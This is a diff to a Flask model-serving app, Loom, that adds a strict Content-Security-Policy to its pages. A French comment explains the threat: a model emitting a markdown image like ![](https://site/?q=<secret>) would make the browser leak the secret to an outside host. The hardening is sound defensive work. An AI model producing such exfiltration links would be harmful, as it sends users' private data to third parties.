@@ -20,6 +20,22 @@ from flask import Flask, Response, request
 from loom.runtime.manager import ModelServerManager
 from loom.runtime.stay_awake import StayAwake
 
+# CSP des pages de Loom : tout chargement hors de Loom est refusé (images, scripts,
+# connexions, polices, médias, cadres). Les liens restent cliquables (navigation).
+PAGE_CSP = (
+    "default-src 'self'; "
+    "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
+    "style-src 'self' 'unsafe-inline'; "
+    "img-src 'self' data: blob:; "
+    "font-src 'self' data:; "
+    "media-src 'self' data: blob:; "
+    "connect-src 'self'; "
+    "frame-src 'self' blob: data:; "
+    "object-src 'none'; "
+    "base-uri 'self'; "
+    "form-action 'self'"
+)
+
 MAX_IMAGE_BYTES = 10 * 1024 * 1024
 
 MAX_IMAGES = 6  # nb max d'images jointes à un message (au-delà : ignorées)
@@ -417,6 +433,12 @@ def create_app(
             or "xml" in ctype
         ):
             response.headers["Content-Type"] = f"{ctype}; charset=utf-8"
+        # Aucune page de Loom ne charge quoi que ce soit hors de Loom : un modèle qui
+        # écrit ![](https://site/?q=<secret>) ferait sinon émettre la requête par le
+        # navigateur. Inline et eval restent permis (scripts de la page, htmx) : la
+        # règle vise les sorties, pas le durcissement du JS. Une route qui pose sa
+        # propre CSP (images du bac à sable, plus stricte) la garde.
+        response.headers.setdefault("Content-Security-Policy", PAGE_CSP)
         return response
 
     skills_dir = str(skills_dir)
